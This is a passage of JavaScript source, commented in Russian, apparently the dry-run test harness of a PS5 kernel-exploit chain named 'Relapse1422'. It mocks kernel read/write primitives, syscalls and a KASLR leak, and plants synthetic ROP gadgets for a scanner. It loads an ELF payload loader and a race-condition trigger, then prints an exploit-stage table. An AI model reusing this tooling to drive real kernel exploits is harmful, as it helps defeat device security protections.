		write4(a,v) { const o = addrOf(a); if (isKernel(a)) { kw.set(o, v >>> 0); return; } if (o < MEM) for (let i=0;i<4;i++) mem[o+i] = (v >>> (i*8)) & 0xff; },
		write8(a,v) { p.write4(a, v.low ?? 0); const o = addrOf(a); p.write4(ptr(o+4), v.hi ?? 0); },
	};
	const chain = {
		async syscall(num, ...args) {
			if (num === 0x014) return { low: 275 };                          // getpid
			if (num === 0x1E7) { p.write4(args[args.length-1], 1); return { low: 0 }; } // getaffinity -> 0x1
			if (num === 0x061) return { low: 3 };                            // socket -> fd=3
			if (num === 0x062) return { low: 0 };                            // connect -> OK
			if (num === 0x004) return { low: args[2] | 0 };                  // write -> записали len
			if (num === 0x006) return { low: 0 };                            // close
			if (num === 0x1DD) return { low: 0x70000000, hi: 0 };            // mmap
			if (num === 0x04A) return { low: 0 };                            // mprotect
			return { low: 0 };
		},
		async rtmsg2() {                                                   // ответ с ret = predict
			const buf = new Uint8Array(512);
			buf[0] = 0x04; buf[1] = 0x00;
			const ret = 0x00B06869, at = 184;
			for (let i=0;i<4;i++) buf[at+i] = (ret >>> (i*8)) & 0xff;
			for (let i=0;i<4;i++) buf[at+4+i] = 0xff;                      // ret.hi = 0xffffffff
			return buf;
		},
		add_syscall() {}, add_syscall_ret() {},
	};
	// синтетический «текст ядра» с вкраплёнными паттернами — доказательство работы сканера
	const text = new Uint8Array(0x8000);
	const put = (off, arr) => { for (let i = 0; i < arr.length; i++) text[off + i] = arr[i]; };
	put(0x0100, [0x5f, 0xc3]);                       // pop rdi; ret
	put(0x0200, [0x5e, 0xc3]);                       // pop rsi; ret
	put(0x0300, [0x5a, 0xc3]);                       // pop rdx; ret
	put(0x0400, [0x58, 0xc3]);                       // pop rax; ret
	put(0x0500, [0x48, 0x89, 0x07, 0xc3]);           // mov [rdi], rax; ret
	put(0x0600, [0x48, 0x8b, 0x07, 0xc3]);           // mov rax, [rdi]; ret
	put(0x0700, [0x0f, 0x01, 0xf8, 0xc3]);           // swapgs; ret
	put(0x0800, [0x48, 0xcf]);                       // iretq
	put(0x0900, [0x48, 0x0f, 0x07]);                 // sysretq
	put(0x1000, [0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3]);   // mov eax,1; syscall; ret
	put(0x1020, [0xb8, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3]);   // mov eax,4; syscall; ret
	put(0x1040, [0xb8, 0x14, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3]);   // mov eax,20; syscall; ret
	put(0x1060, [0x0f, 0x05, 0xc3]);                                  // безымянный стаб
	// строка для self-check crossPipes (ищется discoverRodataProbe)
	const rodata = Uint8Array.from("_aio_submit_cmd\u0000_aio_multi_wait", (c) => c.charCodeAt(0));
	put(0x2000, rodata);
	const kstore = new Map();                    // записанные в «ядро» 4-байтные значения
	// oid.cpus при дельте +0x28000: 0x028CEF68 + 0x28000 + 0x14 (kind) = 0x028F6F7C
	const OID_KIND_ADDR = 0x028F6F7C;

	// эмуляция ядра: единая функция чтения, используется и rw, и pipeRead
	const RODATA_LO = 0x01359d6c, RODATA_HI = 0x01399d6c;   // окно скана rodata
	const readBytes = (addr, len) => {
		if (badKernel) return new Uint8Array(len);              // «мусор»: нули
		const o = addrOf(addr);
		if (len === 4) {
			if (kstore.has(o)) { const v = kstore.get(o); return new Uint8Array([v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]); }
			if (o === OID_KIND_ADDR) { const v = noOid ? 0xDEADBEEF : 0x80048002; return new Uint8Array([v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]); }
			if (o >= RODATA_LO && o <= RODATA_HI) { const off = o % text.length; return new Uint8Array([text[off], text[(off + 1) % text.length], text[(off + 2) % text.length], text[(off + 3) % text.length]]); }
			{ const v = 275; return new Uint8Array([v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]); }   // pid
		}
		if (len === 8) return new Uint8Array([0x00, 0x00, 0x88, 0x88, 0xff, 0xff, 0xff, 0xff]);
		const off = o % text.length;                            // скан текста: синтетика
		const out = new Uint8Array(len);
		for (let i = 0; i < len; i++) out[i] = text[(off + i) % text.length];
		return out;
	};
	const writeBytes = (addr, bytes) => {
		const o = addrOf(addr);
		let v = 0;
		for (let i = 0; i < Math.min(4, bytes.length); i++) v |= (bytes[i] & 0xff) << (i * 8);
		kstore.set(o, v >>> 0);
	};
	const rw = { async read(addr, len) { return readBytes(addr, len); }, async write(addr, bytes) { writeBytes(addr, bytes); } };
	if (full) {
		// «настоящий» примитив: готов, умеет pipe-доступ (стадия 8 не деградирует)
		p.ready = () => true;
		p.readBytes = async (ptr, len) => {   // бульк-чтение памяти процесса
			const o = addrOf(ptr); const out = new Uint8Array(len);
			for (let i = 0; i < len; i++) out[i] = (o + i) < MEM ? mem[o + i] : 0;
			return out;
		};
		p.writeBytes = async (ptr, bytes) => { // бульк-запись памяти процесса
			const o = addrOf(ptr);
			for (let i = 0; i < bytes.length; i++) if ((o + i) < MEM) mem[o + i] = bytes[i];
			return bytes.length;
		};
		p.pipeReadBytes = async (addr, len) => readBytes(addr, len);   // bulk kernel read via pipe
		p.pipeRead = async (addr, len, out) => { const b = readBytes(addr, len); for (let i = 0; i < len; i++) p.write1(out.add32(i), b[i]); return len; };
		p.pipeWrite = async (addr, val, len) => {
			const bytes = new Uint8Array(len);
			let v = Number(val) >>> 0;
			for (let i = 0; i < len; i++) { bytes[i] = v & 0xff; v = Math.floor(v / 256); }
			writeBytes(addr, bytes);
			return len;
		};
	}
	return { p, chain, rw };
}

async function dryRunCli(badKernel, noOid, full) {
	const { p, chain, rw } = makeDryRunMocks(!!badKernel, !!noOid, !!full);
	// payload: реальный ELF из tools/payload/payloads (или --payload <path>)
	// payload ищем и относительно CWD, и относительно самого модуля (иначе результат
	// зависит от того, из какого каталога запущен CLI).
	let payloadBytes = null, payloadLabel = "(нет)", payloadErr = null;
	try {
		const fs = await import("node:fs/promises");
		const { fileURLToPath } = await import("node:url");
		const pi = process.argv.indexOf("--payload");
		const base = pi > 0 ? process.argv[pi + 1] : "elfldr-ps5-v0.27.elf";
		const leaf = base.replace(/^.*[\\/]/, "");
		const cands = [];
		if (pi > 0) cands.push(base);
		cands.push("tools/payload/payloads/" + leaf);
		cands.push(fileURLToPath(new URL("../../payload/payloads/" + leaf, import.meta.url)));
		for (const c of cands) {
			try { payloadBytes = new Uint8Array(await fs.readFile(c)); payloadLabel = `${c} (${payloadBytes.length} байт)`; break; }
			catch (e) { payloadErr = e; }
		}
		if (!payloadBytes) payloadLabel = "не загружен: " + ((payloadErr && payloadErr.message) || payloadErr);
	} catch (e) {
		payloadLabel = "не загружен: " + ((e && e.message) || e);
	}
	globalThis.window = globalThis;
	// офсеты ищем рядом (обычный случай) или в jb1422/kernel (когда файл скопирован в tools/kexpl)
	const offCandidates = ["./offsets/1422.js", "../jb1422/kernel/offsets/1422.js", "../../tools/jb1422/kernel/offsets/1422.js"];
	let loaded = false;
	for (const rel of offCandidates) {
		try { await import(new URL(rel, import.meta.url).href); loaded = true; break; } catch (e) { /* пробуем следующий */ }
	}
	if (!loaded || !globalThis.window.KRW) {
		console.error("не удалось загрузить offsets/1422.js — положите его в ./offsets/ или в ../jb1422/kernel/offsets/");
		process.exitCode = 1;
		return;
	}
	const krw = globalThis.window.KRW;
	console.log(`=== Relapse1422 DRY-RUN${badKernel ? " · KASLR-FAIL" : ""}${noOid ? " · NO-OID" : ""}${full ? " · FULL (p.ready, pipe-R/W)" : ""} (моки, консоль не нужна) ===`);
	console.log(`firmware: ${krw.firmware} (сборка ${krw.built})`);
	console.log(`константы: kernelData=0x${krw.kernelData.toString(16)} allproc=0x${krw.allproc.toString(16)} ` +
		`security_flags=0x${krw.securityFlags.toString(16)} rootvnode=0x${krw.rootvnode.toString(16)}`);
	console.log(`KASLR: predict=0x${krw.kaslr.retStatic.toString(16)} окно 0x${krw.kaslr.window.lo.toString(16)}..0x${krw.kaslr.window.hi.toString(16)}`);
	// триггер t1 для стадии 13 (AIO sanity check) — ищем и от CWD, и от модуля
	let triggerBytes = null, triggerLabel = "(нет)";
	try {
		const fs = await import("node:fs/promises");
		const { fileURLToPath } = await import("node:url");
		const leaf = "t1_aio_wait_race.elf";
		const cands = ["tools/jb1422/payloads/triggers/" + leaf,
			fileURLToPath(new URL("../payloads/triggers/" + leaf, import.meta.url)),      // kernel/ -> jb1422/payloads
			fileURLToPath(new URL("../../payloads/triggers/" + leaf, import.meta.url)),   // запасной вариант
			fileURLToPath(new URL("../../jb1422/payloads/triggers/" + leaf, import.meta.url))];
		for (const c of cands) {
			try { triggerBytes = new Uint8Array(await fs.readFile(c)); triggerLabel = `${c} (${triggerBytes.length} байт)`; break; } catch (e) { /* следующий */ }
		}
	} catch (e) { triggerLabel = "не загружен: " + ((e && e.message) || e); }
	console.log(`trigger: ${triggerLabel}`);
	console.log(`payload: ${payloadLabel}`);
	console.log("");
	const lines = [];
	const res = await runKernelExploitWith(p, chain, (t) => lines.push(t), { attachKernelRw: () => rw, payload: payloadBytes, triggerPayload: triggerBytes, triggerName: "t1_aio_wait_race.elf", elfldrNoWait: true });
	for (const l of lines) if (!l.startsWith("Relapse1422")) console.log("  " + l);
	console.log("\n=== ТАБЛИЦА СТАДИЙ ===");
	console.log("  n | стадия                                      | статус   | деталь");
	console.log("  --+---------------------------------------------+----------+------------------------------------------");
	for (const st of (res.stages || [])) {
		const nm = st.name.padEnd(44).slice(0, 44);
		console.log(`  ${String(st.n).padStart(2)} | ${nm} | ${String(st.status).padEnd(8)} | ${(st.detail || "").slice(0, 60)}`);
	}
	const st = res.stages || [];
	const cnt = (x) => st.filter((s) => s.status === x).length;
	console.log(`\nИТОГ: done=${res.done}, стадий=${st.length}, OK=${cnt("OK")}, DEGRADED=${cnt("DEGRADED")}, FAIL=${cnt("FAIL")}`);
	if (res.kbase) console.log(`kbase: ${res.kbase.toString ? res.kbase.toString(16) : JSON.stringify(res.kbase)}`);
	console.log(res.done ? "РЕЗУЛЬТАТ: цепочка исполнена до конца на моках (fallback по DEGRADED сработал)." : "РЕЗУЛЬТАТ: цепочка остановлена на стадии " + res.stage);
	process.exitCode = res.done ? 0 : ((badKernel || noOid) ? 0 : 1);   // режимы с ожидаемым провалом
}

if (NODE && process.argv[1] && process.argv.some((a) => a.startsWith("--dry-run"))) {
	const { pathToFileURL } = await import("node:url");
	if (import.meta.url === pathToFileURL(process.argv[1]).href) {
		await dryRunCli(process.argv.includes("--dry-run-kaslr-fail"), process.argv.includes("--dry-run-no-oid"), process.argv.includes("--dry-run-full"));
	}
}
